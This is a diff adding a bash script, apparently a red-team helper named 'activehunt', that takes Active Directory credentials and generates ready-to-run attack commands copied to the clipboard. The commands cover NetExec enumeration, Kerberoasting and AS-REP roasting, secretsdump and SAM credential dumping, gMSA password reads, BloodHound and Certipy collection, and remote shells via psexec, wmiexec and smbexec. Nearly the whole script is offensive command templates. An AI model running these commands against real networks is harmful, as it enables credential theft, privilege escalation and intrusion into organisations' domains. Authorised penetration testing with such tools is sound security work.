@@ -1,0 +1,145 @@
+#!/bin/bash
+
+# Vibe Colors
+GREEN='\033[0;32m'
+CYAN='\033[0;36m'
+YELLOW='\033[1;33m'
+PURPLE='\033[0;35m'
+RED='\033[0;31m'
+NC='\033[0m'
+
+# Check for xclip
+if ! command -v xclip &> /dev/null; then
+    sudo apt update && sudo apt install xclip -y
+fi
+
+clear
+echo -e "${RED}"
+# Using a Here-Doc to prevent any backtick/quote issues
+cat << "EOF"
+             _   _            _                 _   
+   __ _  ___| |_(_)_   _____| |__  _   _ _ __ | |_ 
+  / _` |/ __| __| \ \ / / _ \ '_ \| | | | '_ \| __|
+ | (_| | (__| |_| |\ V /  __/ | | | |_| | | | | |_ 
+  \__,_|\___|\__|_| \_/ \___|_| |_|\__,_|_| |_|\__|
+EOF
+
+echo -e "${NC}"
+echo -e "${CYAN}      by sh1nz3r | AD Command Generator${NC}"
+echo -e "${PURPLE}-------------------------------------------------------${NC}"
+
+# Initial Credential Setup
+read -e -p "Username: " USER
+read -e -p "Password: " PASS
+read -e -p "Domain: " DOMAIN
+read -e -p "DC Host/IP: " DC_HOST
+read -e -p "Use Kerberos? (y/n): " USE_KRB
+
+KRB_FLAG=""
+if [[ "$USE_KRB" == "y" ]]; then
+    KRB_FLAG="-k --kdcHost $DC_HOST"
+fi
+
+# Function to display and copy
+output() {
+    echo -e "\n${GREEN}[!] Command (Copied to Clipboard):${NC}"
+    echo -e "${CYAN}$1${NC}"
+    echo -n "$1" | xclip -selection clipboard
+}
+
+while true; do
+    echo -e "\n${YELLOW}--- [ CATEGORIES ] ---${NC}"
+    echo "1)  NXC: Granular Enum (Users, Groups, Computers, GPOs, DCs)"
+    echo "2)  NXC: Security Checks (Pass-Pol, Delegation, Null Sessions)"
+    echo "3)  NXC: Access Hunting (Local Admin, Shares, MSSQL, gMSA)"
+    echo "4)  Impacket: Kerberos Attacks (AS-REP, Kerberoasting, GetTGT, GetST)"
+    echo "5)  Impacket: Remote Dumping (SecretsDump, SAM, NetView)"
+    echo "6)  Infrastructure & Trusts: Foreign Members & ACLs"
+    echo "7)  BloodHound & ADCS (Certipy)"
+    echo "8)  Lateral Movement: Shells & Execution (psexec, wmiexec, etc)"
+    echo "9)  Exit"
+    echo -e "${PURPLE}------------------------------------${NC}"
+    read -e -p "Selection: " CAT
+
+    case $CAT in
+        1)
+            echo -e "1) All  2) Users  3) Groups  4) Computers  5) GPOs  6) DCs"
+            read -e -p "Sub-selection: " SUB
+            case $SUB in
+                1) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --users --groups --computers --gpo --dc-list" ;;
+                2) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --users" ;;
+                3) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --groups" ;;
+                4) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --computers" ;;
+                5) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --gpo" ;;
+                6) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --dc-list" ;;
+            esac
+            ;;
+        2)
+            echo "1) Password Policy  2) Trusted for Delegation  3) Null Sessions"
+            read -e -p "Sub-selection: " SUB
+            case $SUB in
+                1) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --pass-pol" ;;
+                2) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --trusted-for-delegation" ;;
+                3) output "nxc smb $DC_HOST -u '' -p '' --null-session" ;;
+            esac
+            ;;
+        3)
+            echo "1) Local Admin Hunter  2) Shares  3) MSSQL Discovery  4) gMSA Password Read"
+            read -p "Sub-selection: " SUB
+            case $SUB in
+                1) read -p "Range: " RANGE; output "nxc smb $RANGE $KRB_FLAG -u '$USER' -p '$PASS' --local-auth" ;;
+                2) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' --shares" ;;
+                3) read -p "Range: " RANGE; output "nxc mssql $RANGE $KRB_FLAG -u '$USER' -p '$PASS'" ;;
+                4) output "nxc smb $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' -M gmsa" ;;
+            esac
+            ;;
+        4)
+            echo "1) AS-REP Roasting  2) Kerberoasting  3) Get TGT  4) Constrained Delegation (GetST)"
+            read -e -p "Sub-selection: " SUB
+            case $SUB in
+                1) output "impacket-GetNPUsers '$DOMAIN/$USER:$PASS' -dc-ip $DC_HOST -request" ;;
+                2) output "impacket-GetUserSPNs '$DOMAIN/$USER:$PASS' -dc-ip $DC_HOST -request" ;;
+                3) output "impacket-getTGT '$DOMAIN/$USER:$PASS' -dc-ip $DC_HOST" ;;
+                4) read -p "Target SPN (e.g. cifs/target.dev.local): " SPN; output "impacket-getST '$DOMAIN/$USER:$PASS' -spn '$SPN' -dc-ip $DC_HOST" ;;
+            esac
+            ;;
+        5)
+            echo "1) NetView  2) SecretsDump  3) SAM Dump"
+            read -e -p "Sub-selection: " SUB
+            case $SUB in
+                1) output "impacket-netview '$DOMAIN/$USER:$PASS' -target $DC_HOST" ;;
+                2) output "impacket-secretsdump '$DOMAIN/$USER:$PASS@$DC_HOST'" ;;
+                3) output "impacket-samrdump '$DOMAIN/$USER:$PASS@$DC_HOST'" ;;
+            esac
+            ;;
+        6)
+            echo "1) Foreign Members (LDAP)  2) Find Delegation"
+            read -e -p "Sub-selection: " SUB
+            case $SUB in
+                1) output "nxc ldap $DC_HOST $KRB_FLAG -u '$USER' -p '$PASS' -M foreign_members" ;;
+                2) output "impacket-findDelegation '$DOMAIN/$USER:$PASS' -dc-ip $DC_HOST" ;;
+            esac
+            ;;
+        7)
+            echo "1) BloodHound Python (Ingestor)  2) Certipy (ADCS Finder)"
+            read -e -p "Sub-selection: " SUB
+            case $SUB in
+                1) output "bloodhound-python -u '$USER' -p '$PASS' -d $DOMAIN -ns $DC_HOST -c All" ;;
+                2) output "certipy find -u '$USER' -p '$PASS' -target $DC_HOST -stdout" ;;
+            esac
+            ;;
+        8)
+            echo "1) wmiexec  2) psexec  3) smbexec"
+            read -e -p "Sub-selection: " SUB
+            read -e -p "Target IP: " TARGET_IP
+            case $SUB in
+                1) output "impacket-wmiexec '$DOMAIN/$USER:$PASS@$TARGET_IP'" ;;
+                2) output "impacket-psexec '$DOMAIN/$USER:$PASS@$TARGET_IP'" ;;
+                3) output "impacket-smbexec '$DOMAIN/$USER:$PASS@$TARGET_IP'" ;;
+            esac
+            ;;
+        9) exit 0 ;;
+        *) echo -e "${RED}[!] Invalid Selection${NC}" ;;
+    esac
+    echo -e "\n${PURPLE}------------------------------------${NC}"
+done
